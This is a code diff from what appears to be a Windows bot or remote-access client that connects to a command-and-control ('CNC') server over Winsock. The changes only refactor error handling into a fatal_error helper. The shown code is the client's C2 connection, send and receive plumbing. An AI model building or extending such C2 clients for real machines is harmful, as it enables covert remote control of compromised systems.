@@ -5,6 +5,7 @@
 #include <ws2tcpip.h>
 #include <stdio.h>
 #include "cnc.h"
+#include "utils.h"
 #include "logger.h"
 
 SOCKET cnc_sock = INVALID_SOCKET;
@@ -17,10 +18,7 @@ void init_winsock()
 
     ret = WSAStartup(MAKEWORD(2, 2), &wsaData);
     if (ret)
-    {
-        log_error("WSAStartup failed: %d", ret);
-        exit(EXIT_FAILURE);
-    }
+        fatal_error("WSAStartup failed: %d", ret);
     log_debug("Initialized Winsock.");
 }
 
@@ -33,18 +31,12 @@ void get_cnc_addrinfo(struct addrinfo **result)
 
     ret = getaddrinfo(cnc_host, CNC_PORT, &hints, result);
     if (ret)
-    {
-        log_error("getaddrinfo failed: %d", ret);
-        exit(EXIT_FAILURE);
-    }
+        fatal_error("getaddrinfo failed: %d", ret);
 
     cnc_addrinfo = *result;
     ret = WSAAddressToStringA(cnc_addrinfo->ai_addr, cnc_addrinfo->ai_addrlen, NULL, cnc_addr, &cnc_addr_len);
     if (ret)
-    {
-        log_error("WSAAddressToStringA failed: %d", ret);
-        exit(EXIT_FAILURE);
-    }
+        fatal_error("WSAAddressToStringA failed: %d", ret);
     log_debug("CNC's address: %s", cnc_addr);
 }
 
@@ -53,10 +45,7 @@ void init_cnc_sock()
     cnc_sock = socket(AF_INET, SOCK_STREAM, 0);
 
     if (cnc_sock == INVALID_SOCKET)
-    {
-        log_error("Error at socket(): %ld", WSAGetLastError());
-        exit(EXIT_FAILURE);
-    }
+        fatal_error("Error at socket(): %ld", WSAGetLastError());
 }
 
 void connect_to_cnc(struct addrinfo *cnc_addrinfo)
@@ -70,10 +59,7 @@ void connect_to_cnc(struct addrinfo *cnc_addrinfo)
         {
             ret = WSAGetLastError();
             if (ret != WSAECONNREFUSED)
-            {
-                log_error("Error at connect(): %ld", ret);
-                exit(EXIT_FAILURE);
-            }
+                fatal_error("Error at connect(): %ld", ret);
             else
             {
                 log_warning("Failed to connect to CNC. Retrying in %ds.", SLEEP_INTERVAL_ON_CONNREFUSED_MS / 1000);
@@ -105,10 +91,7 @@ int send_to_cnc(void *buf, size_t len)
     {
         ret = send(cnc_sock, buf, len, 0);
         if (ret == SOCKET_ERROR)
-        {
-            log_error("Error at send(): %ld", WSAGetLastError());
-            exit(EXIT_FAILURE);
-        }
+            fatal_error("Error at send(): %ld", WSAGetLastError());
         if (!ret)
         {
             log_error("Connection with CNC broke.");
@@ -127,10 +110,7 @@ int recv_from_cnc(void *buf, size_t len)
     {
         ret = recv(cnc_sock, buf, len, 0);
         if (ret == SOCKET_ERROR)
-        {
-            log_error("Error at recv(): %ld", WSAGetLastError());
-            exit(EXIT_FAILURE);
-        }
+            fatal_error("Error at recv(): %ld", WSAGetLastError());
         if (!ret)
         {
             log_error("Connection with CNC broke.");
